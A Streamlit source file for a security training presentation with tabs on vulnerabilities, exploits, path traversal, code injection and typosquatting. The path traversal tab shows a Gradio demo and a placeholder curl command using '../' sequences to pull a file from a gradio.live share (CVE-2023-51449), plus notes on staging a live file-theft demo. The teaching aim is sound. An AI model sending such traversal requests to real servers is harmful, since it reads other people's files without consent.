import streamlit as st
import subprocess
from streamlit_ace import st_ace

tab1, tab2, tab3, tab4, tab5, tab6  = st.tabs(["vulnerabilities", "exploits", "path traversal", "code injection", "typosquatting", "attacking"])
# taken from edx:
#A vulnerability is a flaw in a system's design,
#implementation or operation,
#that can be exploited to violate
#the system's security policy.

# bugs:
#That's well and good, except bugs are usually
#perceived to be implementation mistakes.
#In fact, systems can and do have bugs
#in the way they're designed and used as well.

# exploits
#An exploit leverages a vulnerability
#to violate a system's security policy.
#So while a vulnerability is the actual
#problem with the system,
#an exploit is what takes advantage
#of that problem, usually with malicious intent.

with tab1:
    st.write("### structure of chapter:")
    st.write("""
             # visualisation breakage in thinking process, and breackage in coding process (system design vs implementation)
             # continue exploit -> search and using breakacge in thinking
             what are vulnerabilities vs bugs 
    """)

with tab2:
        st.write("""
             what are exploits 
             3. Python specific: \n
             What are the threats and what can I do?
             - list of threats to adress
             1. path traversal
             2. code injection
             ...
             - how can you go about it """)


with tab3:
    col1, col2 = st.columns(2)

    with col1:
        st.write("""
         CVE-2023-51449\n
        """)
        code_text = """ 
             import gradio as gr

             demo_img = "./pages/scripts/assets/skull-and-crossbones.png"
             
             def show_image(img):
                 return img
             
             app = gr.Interface(
                 fn=show_image,
                 inputs=gr.Image(label="Input Image Component", value=demo_img, height=800, width=800),
                 outputs=[gr.Image(label="Output Image Component", height=400, width=400, image_mode="L")]
             )
             
             app.launch(share=True)"""
        st.code(code_text)

        def run_py_script(script_name):

             command = ["python", '-u', script_name]
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
             while process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    continue
                st.write(line.strip())
    
        script_name = st.text_input('Enter the name of the python script:')
    
        
        # When the user submits the script name, run the shell script
        if st.button('Run'):
            run_py_script(script_name)

    with col2:
        
        dummy_cmd = "curl --list-only --path-as-is https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx/../../../path/to/asset.jpeg --output /path/to/your/copy.jpeg"
        st.write(dummy_cmd)
        content = st_ace(language='css')

        st.image("./pages/scripts/assets/gradio_demo.jpg")

         
##
##"""
##Storyline of gradio app vulnerability -> show code -> run code -> print console output to the presentation (but modified) 
##-> send roman modified version and roman seemlingly inserts the modified version but actually inserts the real version 
##(if quick might be enough if it is the real version)
##steals the picture and then shows it on his PC -> large emoji or urlaubsbild
##
##idea to display -> show two consoles next to each other gradio app in python + output and linux terminal with curl command
##-> out put = image with title stolen -> roman zeigt seins hoch in die camera
##"""


with tab4:
     st.write("Roman vulnerability")

with tab5:
     st.write(""" 
              Maby next/Separate Chapter? \n
              promised multi-stage-attack details -> \n
              look deeper into the case of typosquatting -> explain the case \n
                       """)

with tab6:
     st.write(""" 
              -> deeper into type of attacks at the end of the session for now: \n
              most common type of attack with success and recent development more of them (check source) \n
              multi-stage-attack -> multi step approach mainly looking for information trying to get into the system by a low level vulnerable entry point
              to maintain and widen acces to the internal system gaining acces to privileges in the system to get acces to data they can use for profit
              again in detail later on the single steps and how to counter them individually \n
              -> shows attackers leverages many vulnerabilities -> goal is to know how to minimize entrypoints or wholes thet can be used by others \n
                """)
